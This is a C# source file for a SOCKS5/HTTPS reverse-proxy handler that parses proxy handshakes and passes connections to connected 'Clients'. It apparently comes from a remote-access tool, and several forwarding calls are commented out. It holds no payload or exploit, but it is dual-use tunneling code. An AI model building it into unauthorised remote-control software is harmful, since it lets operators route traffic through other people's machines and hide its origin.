﻿using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using PEGASUS.Diadyktio;

namespace PEGASUS.IcarusWings
{
    public class ReverseProxyClient
    {
        public enum ProxyType
        {
            Unknown,
            SOCKS5,
            HTTPS
        }

        public const int SOCKS5_DEFAULT_PORT = 3218;
        public const byte SOCKS5_VERSION_NUMBER = 5;
        public const byte SOCKS5_RESERVED = 0x00;
        public const byte SOCKS5_AUTH_NUMBER_OF_AUTH_METHODS_SUPPORTED = 2;
        public const byte SOCKS5_AUTH_METHOD_NO_AUTHENTICATION_REQUIRED = 0x00;
        public const byte SOCKS5_AUTH_METHOD_GSSAPI = 0x01;
        public const byte SOCKS5_AUTH_METHOD_USERNAME_PASSWORD = 0x02;
        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_BEGIN = 0x03;
        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_END = 0x7f;
        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_BEGIN = 0x80;
        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_END = 0xfe;
        public const byte SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS = 0xff;
        public const byte SOCKS5_CMD_REPLY_SUCCEEDED = 0x00;
        public const byte SOCKS5_CMD_REPLY_GENERAL_SOCKS_SERVER_FAILURE = 0x01;
        public const byte SOCKS5_CMD_REPLY_CONNECTION_NOT_ALLOWED_BY_RULESET = 0x02;
        public const byte SOCKS5_CMD_REPLY_NETWORK_UNREACHABLE = 0x03;
        public const byte SOCKS5_CMD_REPLY_HOST_UNREACHABLE = 0x04;
        public const byte SOCKS5_CMD_REPLY_CONNECTION_REFUSED = 0x05;
        public const byte SOCKS5_CMD_REPLY_TTL_EXPIRED = 0x06;
        public const byte SOCKS5_CMD_REPLY_COMMAND_NOT_SUPPORTED = 0x07;
        public const byte SOCKS5_CMD_REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 0x08;
        public const byte SOCKS5_ADDRTYPE_IPV4 = 0x01;
        public const byte SOCKS5_ADDRTYPE_DOMAIN_NAME = 0x03;
        public const byte SOCKS5_ADDRTYPE_IPV6 = 0x04;

        //Make it higher for more performance if really required... probably not
        //Making this number higher will aswell increase ram usage depending on the amount of connections (BUFFER_SIZE x Connections = ~Ram Usage)
        public const int BUFFER_SIZE = 8192;

        private readonly byte[] _buffer;

        //Is used for the handshake, Non-Blocking
        private readonly MemoryStream _handshakeStream;
        private readonly ReverseProxyServer Server;
        private bool _disconnectIsSend;

        private bool _isBindCommand;
        private bool _isConnectCommand;
        private bool _isDomainNameType;
        private bool _isIpType;
        private bool _isIPv6NameType;
        private bool _isUdpCommand;
#pragma warning disable CS0414 // The field 'ReverseProxyClient._receivedConnResponse' is assigned but its value is never used
        private bool _receivedConnResponse = false;
#pragma warning restore CS0414 // The field 'ReverseProxyClient._receivedConnResponse' is assigned but its value is never used

        public ReverseProxyClient(Clients client, Socket socket, ReverseProxyServer server)
        {
            Handle = socket;
            Client = client;
            _handshakeStream = new MemoryStream();
            _buffer = new byte[BUFFER_SIZE];
            IsConnected = true;
            TargetServer = "";
            Type = ProxyType.Unknown;
            Server = server;

            try
            {
                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
            }
        }

        public Socket Handle { get; }
        public Clients Client { get; }

        public long PacketsReceived { get; private set; }
        public long PacketsSended { get; private set; }

        public long LengthReceived { get; private set; }
        public long LengthSent { get; private set; }

        public int ConnectionId => Handle.Handle.ToInt32();

        public string TargetServer { get; private set; }
        public ushort TargetPort { get; private set; }
        public bool IsConnected { get; private set; }

        public ProxyType Type { get; private set; }
        public string HostName { get; private set; }

        public bool ProxySuccessful { get; private set; }

        private void AsyncReceive(IAsyncResult ar)
        {
            try
            {
                var received = Handle.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                if (received > 5000 || _handshakeStream.Length + received > 5000)
                {
                    //attack prevention of overflowing the HandshakeStream
                    //It's really impossible for Socks or HTTPS proxies to use even 5000 for Initial Packets
                    Disconnect();
                    return;
                }

                LengthReceived += received;
                _handshakeStream.Write(_buffer, 0, received);
            }
            catch
            {
                Disconnect();
                return;
            }

            var payload = _handshakeStream.ToArray();

            switch (PacketsReceived)
            {
                case 0:
                {
                    //initial Socks packet
                    if (payload.Length >= 3)
                    {
                        var headerStr = Encoding.ASCII.GetString(payload);

                        //check the proxy client
                        if (payload[0] == SOCKS5_VERSION_NUMBER)
                        {
                            Type = ProxyType.SOCKS5;
                        }
                        else if (headerStr.StartsWith("CONNECT") && headerStr.Contains(":"))
                        {
                            Type = ProxyType.HTTPS;

                            //Grab here the IP / PORT
                            using (var sr = new StreamReader(new MemoryStream(payload)))
                            {
                                var line = sr.ReadLine();
                                if (line == null)
                                    break;

                                //could have done it better with RegEx... oh well
                                var split = line.Split(new[] {" "}, StringSplitOptions.RemoveEmptyEntries);
                                if (split.Length > 0)
                                    try
                                    {
                                        var ipPort = split[1];
                                        TargetServer = ipPort.Split(':')[0];
                                        TargetPort = ushort.Parse(ipPort.Split(':')[1]);

                                        _isConnectCommand = true;
                                        _isDomainNameType = true;

                                        //Send Command to client and wait for response from CommandHandler
                                        //Client.Send(new ReverseProxyConnect
                                        //{
                                        //    ConnectionId = ConnectionId,
                                        //    Target = TargetServer,
                                        //    Port = TargetPort
                                        //});
                                        Server.CallonConnectionEstablished(this);

                                        return; //Quit receiving and wait for client's response
                                    }
                                    catch
                                    {
                                        Disconnect();
                                    }
                            }
                        }
                        else
                        {
                            break;
                        }

                        if (CheckProxyVersion(payload))
                        {
                            SendSuccessToClient();
                            PacketsReceived++;
                            _handshakeStream.SetLength(0);
                            Server.CallonConnectionEstablished(this);
                        }
                    }

                    break;
                }
                case 1:
                {
                    //Socks command
                    var MinPacketLen = 6;
                    if (payload.Length >= MinPacketLen)
                    {
                        if (!CheckProxyVersion(payload))
                            return;

                        _isConnectCommand = payload[1] == 1;
                        _isBindCommand = payload[1] == 2;
                        _isUdpCommand = payload[1] == 3;

                        _isIpType = payload[3] == 1;
                        _isDomainNameType = payload[3] == 3;
                        _isIPv6NameType = payload[3] == 4;

                        Array.Reverse(payload, payload.Length - 2, 2);
                        TargetPort = BitConverter.ToUInt16(payload, payload.Length - 2);

                        if (_isConnectCommand)
                        {
                            if (_isIpType)
                            {
                                TargetServer = payload[4] + "." + payload[5] + "." + payload[6] + "." + payload[7];
                            }
                            else if (_isDomainNameType)
                            {
                                int domainLen = payload[4];
                                if (MinPacketLen + domainLen < payload.Length)
                                    TargetServer = Encoding.ASCII.GetString(payload, 5, domainLen);
                            }

                            if (TargetServer.Length > 0)
                            {
                                //Send Command to client and wait for response from CommandHandler
                                //Client.Send(new ReverseProxyConnect
                                //{
                                //    ConnectionId = ConnectionId,
                                //    Target = TargetServer,
                                //    Port = TargetPort
                                //});
                            }
                        }
                        else
                        {
                            SendFailToClient();
                            return;
                        }

                        Server.CallonUpdateConnection(this);

                        //Quit receiving data and wait for Client's response
                        return;
                    }

                    break;
                }
            }

            try
            {
                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
            }
        }

        public void Disconnect()
        {
            if (!_disconnectIsSend)
                _disconnectIsSend = true;
            //send to the Server we've been disconnected
            //Client.Send(new ReverseProxyDisconnect {ConnectionId = ConnectionId});

            try
            {
                Handle.Close();
            }
            catch
            {
            }

            IsConnected = false;
            Server.CallonUpdateConnection(this);
        }

        /// <summary>
        ///     Server -> ProxyClient
        /// </summary>
        /// <param name="payload"></param>
        public void SendToClient(byte[] payload)
        {
            lock (Handle)
            {
                try
                {
                    LengthSent += payload.Length;
                    Handle.Send(payload);
                }
                catch
                {
                    Disconnect();
                }
            }

            Server.CallonUpdateConnection(this);
        }

        private void SendFailToClient()
        {
            if (Type == ProxyType.HTTPS)
                Disconnect();

            if (Type == ProxyType.SOCKS5)
            {
                SendToClient(new[] {SOCKS5_VERSION_NUMBER, SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS});
                Disconnect();
            }
        }

        private void SendSuccessToClient()
        {
            if (Type == ProxyType.SOCKS5)
                SendToClient(new[] {SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED});
        }

        private bool CheckProxyVersion(byte[] payload)
        {
            if (Type == ProxyType.HTTPS)
                return true; //unable to check header... there is no header

            if (payload.Length > 0 && payload[0] != SOCKS5_VERSION_NUMBER)
            {
                SendFailToClient();
                Disconnect();
                return false;
            }

            return true;
        }

        //public void HandleCommandResponse(ReverseProxyConnectResponse response)
        //{
        //    //a small prevention for calling this method twice, not required... just incase
        //    if (!_receivedConnResponse)
        //    {
        //        _receivedConnResponse = true;

        //        if (response.IsConnected)
        //        {
        //            this.HostName = response.HostName;

        //            //tell the Proxy Client that we've established a connection
        //            if (Type == ProxyType.HTTPS)
        //            {
        //                SendToClient(Encoding.ASCII.GetBytes("HTTP/1.0 200 Connection established\r\n\r\n"));
        //            }
        //            else if (Type == ProxyType.SOCKS5)
        //            {
        //                //Thanks to http://www.mentalis.org/soft/projects/proxy/ for the Maths
        //                try
        //                {
        //                    List<byte> responsePacket = new List<byte>();
        //                    responsePacket.Add(SOCKS5_VERSION_NUMBER);
        //                    responsePacket.Add(SOCKS5_CMD_REPLY_SUCCEEDED);
        //                    responsePacket.Add(SOCKS5_RESERVED);
        //                    responsePacket.Add(1);
        //                    responsePacket.AddRange(response.LocalAddress);
        //                    responsePacket.Add((byte)(Math.Floor((decimal)response.LocalPort / 256)));
        //                    responsePacket.Add((byte)(response.LocalPort % 256));

        //                    SendToClient(responsePacket.ToArray());
        //                }
        //                catch
        //                {
        //                    //just incase the math failed
        //                    //it will still show it's succesful
        //                    SendToClient(new byte[]
        //                    {
        //                        SOCKS5_VERSION_NUMBER,
        //                        SOCKS5_CMD_REPLY_SUCCEEDED,
        //                        SOCKS5_RESERVED,
        //                        1, //static: it's always 1
        //                        0, 0, 0, 0, //bind ip
        //                        0, 0 //bind port
        //                    });
        //                }
        //            }

        //            _handshakeStream.Close();

        //            ProxySuccessful = true;

        //            try
        //            {
        //                //start receiving data from the proxy
        //                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceiveProxy, null);
        //            }
        //            catch
        //            {
        //                Disconnect();
        //            }
        //        }
        //        else
        //        {
        //            if (Type == ProxyType.HTTPS)
        //            {
        //                Disconnect();
        //            }
        //            else if (Type == ProxyType.SOCKS5)
        //            {
        //                //send a connection fail packet
        //                SendToClient(new byte[]
        //                {
        //                    SOCKS5_VERSION_NUMBER,
        //                    SOCKS5_CMD_REPLY_CONNECTION_REFUSED,
        //                    SOCKS5_RESERVED,
        //                    1, //static: it's always 1
        //                    0, 0, 0, 0, //Bind Address
        //                    0, 0 //Bind Port
        //                });
        //            }
        //        }

        //        Server.CallonUpdateConnection(this);
        //    }
        //}

        private void AsyncReceiveProxy(IAsyncResult ar)
        {
            try
            {
                var received = Handle.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                LengthReceived += received;

                var payload = new byte[received];
                Array.Copy(_buffer, payload, received);
                //Client.Send(new ReverseProxyData {ConnectionId = ConnectionId, Data = payload});

                LengthSent += payload.Length;
                PacketsSended++;
            }
            catch
            {
                Disconnect();
                return;
            }

            PacketsReceived++;

            Server.CallonUpdateConnection(this);

            try
            {
                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceiveProxy, null);
            }
            catch
            {
            }
        }
    }
}